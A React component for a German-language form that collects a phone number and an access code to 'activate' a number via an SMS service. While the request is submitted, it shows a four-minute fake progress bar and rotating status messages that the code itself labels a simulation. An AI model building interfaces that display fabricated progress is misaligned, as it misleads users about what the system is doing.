
import { useState, FormEvent, useRef, useEffect } from 'react';
import { useSMS } from '../context/SMSContext';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Phone, Lock, Loader } from 'lucide-react';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { Progress } from '@/components/ui/progress';

const UserForm = () => {
  const [phone, setPhone] = useState('');
  const [accessCode, setAccessCode] = useState('');
  const [error, setError] = useState<string | null>(null);
  const [showSimulation, setShowSimulation] = useState(false);
  const [progressValue, setProgressValue] = useState(0);
  const [simulationStep, setSimulationStep] = useState(0);
  
  const { submitRequest, currentRequest, isLoading } = useSMS();
  const phoneInputRef = useRef<HTMLInputElement>(null);
  const simulationStartTime = useRef<number | null>(null);
  const totalSimulationTime = 240000; // 4 minutes in milliseconds

  // Messages that will rotate during the simulation
  const simulationMessages = [
    'Verbindung wird hergestellt...',
    'Nummer wird überprüft...',
    'Server wird kontaktiert...',
    'Aktivierung in Bearbeitung...',
    'Warte auf Bestätigung...'
  ];

  useEffect(() => {
    // If the field is empty when component mounts, set default +49 prefix
    if (!phone && phoneInputRef.current) {
      setPhone('+49');
    }
  }, []);

  // Animation for the progress bar when simulation is shown
  useEffect(() => {
    if (showSimulation && !currentRequest) {
      // Set the start time when simulation begins
      if (simulationStartTime.current === null) {
        simulationStartTime.current = Date.now();
      }
      
      // For progress bar animation - linear progress over 4 minutes
      const progressInterval = setInterval(() => {
        const elapsedTime = Date.now() - (simulationStartTime.current || 0);
        const newValue = Math.min((elapsedTime / totalSimulationTime) * 100, 100);
        setProgressValue(newValue);
      }, 100);
      
      // For cycling through activation messages
      const messageInterval = setInterval(() => {
        setSimulationStep(prev => (prev + 1) % simulationMessages.length);
      }, 3000);
      
      return () => {
        clearInterval(progressInterval);
        clearInterval(messageInterval);
      };
    }
    
    // If we now have a currentRequest, hide the simulation
    if (currentRequest) {
      setShowSimulation(false);
      simulationStartTime.current = null;
    }
  }, [showSimulation, currentRequest, simulationMessages.length]);

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setError(null);
    
    // Ensure phone number has the +49 prefix
    let formattedPhone = phone;
    if (!formattedPhone.startsWith('+49')) {
      // If the user added their own country code, don't modify
      if (!formattedPhone.startsWith('+')) {
        // Remove leading zeros if present
        formattedPhone = formattedPhone.replace(/^0+/, '');
        // Add the +49 prefix
        formattedPhone = `+49${formattedPhone}`;
      }
    }
    
    if (formattedPhone && accessCode) {
      // Reset the simulation start time and progress
      simulationStartTime.current = Date.now();
      setProgressValue(0);
      
      // Show simulation before actual submission
      setShowSimulation(true);
      
      // Submit after a short delay to let the simulation show first
      setTimeout(async () => {
        await submitRequest(formattedPhone, accessCode);
      }, 500);
    } else {
      setError('Bitte geben Sie eine Telefonnummer und einen Zugangscode ein.');
    }
  };

  const handlePhoneFieldFocus = () => {
    // If the field is empty, add +49 when focused
    if (!phone) {
      setPhone('+49');
    }
  };

  return (
    <div className="space-y-6">
      <form onSubmit={handleSubmit} className="space-y-6 animate-fade-in">
        {error && (
          <Alert variant="destructive" className="mb-4">
            <AlertDescription>{error}</AlertDescription>
          </Alert>
        )}
        
        <div className="space-y-2">
          <label htmlFor="phone" className="block text-sm font-medium text-gray-700">
            Telefonnummer
          </label>
          <div className="relative">
            <div className="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none">
              <Phone className="h-5 w-5 text-gray-400" />
            </div>
            <Input
              id="phone"
              type="text"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              onFocus={handlePhoneFieldFocus}
              placeholder="+49"
              className="pl-10 w-full"
              ref={phoneInputRef}
              required
              disabled={isLoading || showSimulation}
            />
          </div>
        </div>
        
        <div className="space-y-2">
          <label htmlFor="accessCode" className="block text-sm font-medium text-gray-700">
            Zugangscode
          </label>
          <div className="relative">
            <div className="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none">
              <Lock className="h-5 w-5 text-gray-400" />
            </div>
            <Input
              id="accessCode"
              type="text"
              value={accessCode}
              onChange={(e) => setAccessCode(e.target.value)}
              placeholder="Ihr Zugangscode"
              className="pl-10 w-full"
              required
              disabled={isLoading || showSimulation}
            />
          </div>
        </div>
        
        <Button 
          type="submit" 
          className="w-full bg-orange hover:bg-orange-dark"
          disabled={isLoading || showSimulation}
        >
          {isLoading ? 'Verarbeite...' : 'Nummer aktivieren'}
        </Button>
      </form>
      
      {/* Simulation box that appears below the form */}
      {showSimulation && !currentRequest && (
        <div className="mt-8 p-6 border border-gray-200 rounded-lg bg-white shadow-md animate-fade-in">
          <div className="text-center py-4">
            <div className="flex justify-center mb-6">
              <div className="w-16 h-16 rounded-full bg-orange-light/20 flex items-center justify-center">
                <Loader className="w-8 h-8 text-orange animate-spin" />
              </div>
            </div>
            <h3 className="text-xl font-medium mb-2">Nummer wird aktiviert...</h3>
            <p className="text-gray-500 mb-4">Dies kann bis zu 4 Minuten dauern</p>
            
            <div className="relative my-8 bg-gray-100 p-4 rounded-lg">
              <p className="text-gray-700 animate-fade-in">{simulationMessages[simulationStep]}</p>
              <div className="absolute -bottom-1 left-0 w-full h-1 overflow-hidden">
                <div className="h-full bg-orange animate-pulse-slow" style={{ width: '30%' }}></div>
              </div>
            </div>
            
            <div className="w-full max-w-xs mx-auto mt-8">
              <Progress value={progressValue} className="h-2" />
              <div className="flex justify-between mt-2 text-xs text-gray-500">
                <span>Aktivierung läuft</span>
                <span>{Math.round(progressValue)}%</span>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default UserForm;
